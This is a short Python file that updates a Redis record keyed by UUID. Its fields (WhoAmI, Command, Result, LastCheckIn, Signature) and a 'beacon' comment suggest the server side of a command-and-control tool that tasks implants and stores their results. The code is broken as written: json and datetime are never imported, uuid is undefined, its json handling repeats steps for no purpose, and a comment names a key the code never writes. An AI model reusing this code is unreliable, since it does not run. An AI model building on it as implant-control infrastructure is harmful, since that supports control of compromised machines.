import redis
from dataclasses import dataclass

conn = redis.StrictRedis(host='localhost', port=6379, db=0)
def updateDB():
    connt = conn.hget('UUID', uuid)  # Get the struct
    connt = connt.decode()  # Decode it from bytes
    connt = json.loads(connt)  # it's returned as string so convert it to dict
    structure = json.dumps(connt)  # Dump the dict to json
    connector = json.loads(structure)  # Load it into a new var
    command = connector["Command"]  # Grab the command var from the object
    LastInteraction = connector["LastInteraction"]
    result = connector["Result"]
    whoami = connector["WhoAmI"]
    nonce = connector["Nonce"]
    signature = connector["Signature"]
    print(signature)
    # Set the command to 0
    structure = {
        "WhoAmI": f"{whoami}",
        "Nonce": f"{nonce}",
        "Signature": f"{signature}",
        "Retrieved": "1",  # Set retrieved to 1 so we know we got results
        "Command": "0",
        "LastInteraction": f"{LastInteraction}",
        "LastCheckIn": f"{datetime.today().strftime('%Y-%m-%d %H:%M:%S')}",
        "Result": f"{result}",
        "GotIt": "0"
    }
    structure = json.dumps(structure)  # Dump the json
    # Write the message value to the beacon:UUID key
    conn.hset('UUID', uuid, structure)